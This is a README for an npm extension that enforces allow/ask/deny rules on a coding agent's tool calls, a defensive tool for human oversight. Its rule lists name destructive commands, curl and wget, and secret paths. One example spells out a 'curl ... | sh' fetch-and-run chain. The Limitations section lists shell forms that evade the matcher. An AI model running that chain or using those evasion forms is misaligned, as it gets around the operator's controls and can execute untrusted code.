# @pi-kit/permissions

An allow / ask / deny guardrail for the Pi coding agent's built-in tools. Zero
runtime dependencies, no build step, small enough to read before you install
it.

## Install

```bash
pi install npm:@pi-kit/permissions
```

Restart Pi. With no configuration, the defaults below apply.

## What it does

Before every tool call, the extension resolves the call to one of three
outcomes:

- **allow** — the call runs.
- **ask** — you are prompted: *Allow once*, *Allow for this session*, or
  *Deny*. With no UI (`pi -p`), `ask` becomes `headlessAsk`, which defaults
  to `deny`. In RPC mode Pi reports a UI and forwards the prompt to the RPC
  client.
- **deny** — the call is blocked and the model is told which rule fired.

Three rule dimensions plus one boundary check:

| Dimension | Matches on | Pattern syntax |
|---|---|---|
| `bash` | the command string of `bash` and `powershell`; `deny` and `ask` patterns also match **each segment** of a compound command split on unquoted `&&`, `\|\|`, `;`, `\|`, and newline, while `allow` patterns match the whole command only | anchored; `*` matches anything including spaces and `/` |
| `paths` | path inputs of the tools in `paths.appliesTo` (default `write`, `edit`) | anchored; `*` stays within a segment, `**` crosses; `~` expands; relative patterns resolve against cwd; matched against both the path as written and its absolute form |
| `tools` | the tool name | exact, or `*` |
| `outsideCwd` | any path outside the working directory, for the tools in `paths.appliesTo` | a single `allow` / `ask` / `deny` |

## Limitations

This is a guardrail against **agent mistakes**, not a security boundary.

> Would a well-meaning agent produce this shape while doing a normal task? If
> yes, it belongs. If the only reason to write it is to defeat a rule, it does
> not.

It matches what a cooperative agent writes: plain commands, compound
commands, writes outside the working tree. It makes no attempt to catch
forms whose only purpose is to get past a rule: `bash -c '...'`, `eval`,
`$(...)`, backticks, `$VAR`, `/bin/rm`, `command rm`, `xargs`, `find -exec`,
or wrappers like `timeout` and `nohup`. Text inside subshells, heredocs, and
redirections is opaque to segmentation. Symlinks are not resolved. Paths are
not extracted from bash commands. In RPC mode an `ask` rule is delivered to
the RPC client as an extension UI request; a client that never answers such
requests leaves the tool call waiting, so RPC clients must implement them (a
cancel is a deny).

If you need enforcement, run Pi in a container or behind an OS sandbox; a
string matcher cannot provide it, and the two major CLIs with real shell
parsers say the same about theirs.

## Configuration

JSON, one file per scope:

| Scope | Path |
|---|---|
| Global | `<agent dir>/extensions/pi-kit-permissions.json` — normally `~/.pi/agent/extensions/pi-kit-permissions.json`; honours `PI_CODING_AGENT_DIR` |
| Project | `<cwd>/.pi/extensions/pi-kit-permissions.json` — loaded **only when the project is trusted** |

The project file lives under `extensions` so its presence triggers Pi's
project-trust check even when no other project resources exist. The old flat
path `<cwd>/.pi/pi-kit-permissions.json` is ignored; move that file into
`extensions` to use project configuration.

Every key is optional. Omitted keys take their default.

### Defaults

```json
{
  "defaultMode": "allow",
  "headlessAsk": "deny",
  "outsideCwd": "ask",
  "tools": {},
  "bash": {
    "deny": ["rm -rf *", "git push --force*", "git reset --hard*"],
    "ask": ["npm publish*", "git push*"],
    "allow": []
  },
  "paths": {
    "appliesTo": ["write", "edit"],
    "deny": [".env", ".env.local", ".env.*.local", "**/.env", "**/.env.local"],
    "ask": [".github/**"],
    "allow": []
  }
}
```

### Keys

| Key | Values | Meaning |
|---|---|---|
| `defaultMode` | `allow` `ask` `deny` | Outcome when no rule matches |
| `headlessAsk` | `allow` `deny` | What `ask` becomes with no UI. `ask` is rejected |
| `outsideCwd` | `allow` `ask` `deny` | Outcome for a path outside cwd. `allow` disables the check |
| `tools` `bash` | `{ deny, ask, allow }` | Lists of patterns |
| `paths` | `{ appliesTo, deny, ask, allow }` | `appliesTo` names the tools these rules and `outsideCwd` apply to |

### How scopes combine

Defaults, then the global file, then the trusted project file.

- **Rule lists add up.** `deny`, `ask`, and `allow` lists are unioned across
  scopes. A project can add rules; it can never remove one it inherits.
- **Scalars overwrite.** `defaultMode`, `headlessAsk`, `outsideCwd`, and
  `paths.appliesTo` take the last scope that sets them.
- Consequence: to relax a global `ask` into an `allow`, edit the global file.

### If a config file is broken

A file that fails to parse or validate contributes no rules, a persistent
footer banner names it, and **`defaultMode` is forced to `ask` and effective
`headlessAsk` is forced to `deny`** for the session, so a broken config prompts
more rather than silently loosening. Fix the file and start a new session.

## Precedence

Two rules, and this is the complete specification:

1. **Within a dimension**, lists are checked `deny` → `ask` → `allow`. First
   match wins. Specificity is ignored: `bash.deny: ["git *"]` beats
   `bash.allow: ["git status"]`.
2. **Across whole-request dimensions**, every applicable dimension is evaluated
   and the **most restrictive** result wins: `deny` > `ask` > `allow`. An
   explicit whole-request match can override `defaultMode`. Segment-only bash
   `deny` and `ask` matches may only tighten that resulting outcome.

No whole-request match yields `defaultMode`, subject only to a more restrictive
segment-only bash `deny` or `ask` match.

| Situation | Outcome |
|---|---|
| `bash.allow` matches, `defaultMode: deny` | allow |
| `bash.allow` matches, but a write path is outside cwd with `outsideCwd: ask` | ask |
| `bash.deny` matches one segment of `a && b`, `bash.allow` matches the other | deny |
| `bash.allow: ["ls"]`, `defaultMode: deny`, command `ls && curl x` | deny (`allow` never matches a segment) |
| `defaultMode: deny`, `headlessAsk: allow`, `bash.ask: ["ls"]`, command `echo ready && ls` | deny (a segment-only `ask` cannot loosen the default) |
| Nothing matches, `defaultMode: allow` | allow |
| `read /etc/hosts` under defaults | allow (`read` is not in `appliesTo`) |
| `write /etc/hosts` under defaults | ask |
| `write .env.example` under defaults | allow (the deny patterns are deliberately narrow) |

These rows are executed by `test/decide.test.ts`.

### Session approvals

*Allow for this session* remembers the exact request (tool, command, paths as
written) until the session ends. Nothing is generalised into a pattern and
nothing is written to disk. The block reason names the rule to edit if you
want a permanent change. A session approval is only consulted after the rules
have returned `ask`, so it can never override a `deny`.

## Recipes

Gate reads too:

```json
{ "paths": { "appliesTo": ["read", "write", "edit", "ls", "grep", "find"] } }
```

Protect secrets outside the repo:

```json
{ "paths": { "appliesTo": ["read", "write", "edit"], "deny": ["~/.ssh/**", "~/.aws/**"] } }
```

Git and network operations are bash patterns:

```json
{ "bash": { "ask": ["git push*", "git rebase*", "curl *", "wget *", "npm install*"] } }
```

A bash redirection into a secrets file:

```json
{ "bash": { "deny": ["* > .env*", "* >> .env*"] } }
```

Ask by default, allowing only these exact command strings (inherited rules
still apply):

```json
{
  "defaultMode": "ask",
  "bash": { "allow": ["ls", "git status", "git diff", "git log", "pnpm test"] }
}
```

List specific complete commands to allow flags or arguments. A trailing `*`
in an allow pattern also matches chained commands: `ls*` allows
`ls && curl https://example.com/script | sh` unless a deny or ask rule matches.

## Supported versions

Pi 0.85.1 (pinned in CI; a non-blocking job tracks `latest`). Node 22.19 or
newer, tested on 22.19.0 and 24.

## Licence

MIT
